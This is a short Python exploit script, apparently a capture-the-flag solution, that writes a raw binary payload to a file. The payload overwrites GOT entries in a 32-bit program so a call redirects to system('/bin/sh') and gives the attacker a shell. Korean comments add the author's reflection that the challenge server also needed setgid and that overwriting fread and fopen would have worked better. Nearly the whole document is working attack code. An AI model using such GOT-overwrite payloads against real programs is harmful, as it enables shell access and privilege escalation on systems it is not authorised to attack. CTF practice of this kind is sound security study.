import os

# memset@got 0x0804d03c
# - 0x3cc50 = system@got
payload = ""
payload += "\x05\x00\x13\x00\x38\xd0\x04\x08\x50\x37\x02\x00"
payload += "\x00\x00\x13\x00\x40\xd1\x04\x08\x2f\x62\x69\x6e"
payload += "\x00\x00\x13\x00\x44\xd1\x04\x08\x2f\x73\x68\x00"

# 0x0804896d
payload += "\x00\x00\x13\x00\xb0\xd1\x04\x08\x6d\x89\x04\x08"
payload += "\x4c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
fp = open('payload', 'wb')
fp.write(payload)
fp.close()


#	fopen("/bin/sh") -> system("/bin/sh") 하게했지만 문제서버에서는 setgid까지 해줘야했으므로
#	fread랑 fopen을 덮으면 됬을듯하다.
#	add랑 sub를 잘 사용하면 별도의 leak없이도 할수있는데 내가 너무 어렵게 생각한듯...
#	그동안 공부안해서 깜거은게 너무 티가난다 ㅜ